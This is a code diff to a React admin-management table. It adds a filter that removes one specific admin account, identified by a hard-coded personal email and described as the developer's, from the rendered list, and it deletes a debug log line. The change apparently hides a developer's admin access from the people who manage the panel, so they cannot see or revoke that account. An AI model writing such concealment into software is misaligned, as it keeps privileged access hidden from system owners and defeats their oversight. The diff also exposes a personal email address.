@@ -42,6 +42,16 @@ export default function AdminTable() {
     },
   ];
 
+  // Replace with the email you want to remove (Micheal's THE developer guy)
+  const emailToRemove = "jerrymike80@yahoo.com";
+
+  // Filter out the object with the specified email
+  const filteredDataArray =
+    usermanagementData &&
+    usermanagementData?.data?.filter(
+      (item: any) => item.email !== emailToRemove
+    );
+
   const [showConfirmationModal, setShowConfirmationModal] =
     useState<boolean>(false);
 
@@ -92,8 +102,6 @@ export default function AdminTable() {
       id: adminId,
     };
 
-    console.log("Delete Admin", body);
-
     await deleteAdmin(body);
   };
 
@@ -132,8 +140,8 @@ export default function AdminTable() {
               </thead>
               <tbody className="bg-white text-lg text-[#1E1E1E]">
                 {/* <NestedModal /> */}
-                {usermanagementData &&
-                  usermanagementData.data.map((admin: any, idx: number) => (
+                {filteredDataArray &&
+                  filteredDataArray.map((admin: any, idx: number) => (
                     <tr className="bg-white border-b" key={admin._id}>
                       <th
                         scope="row"
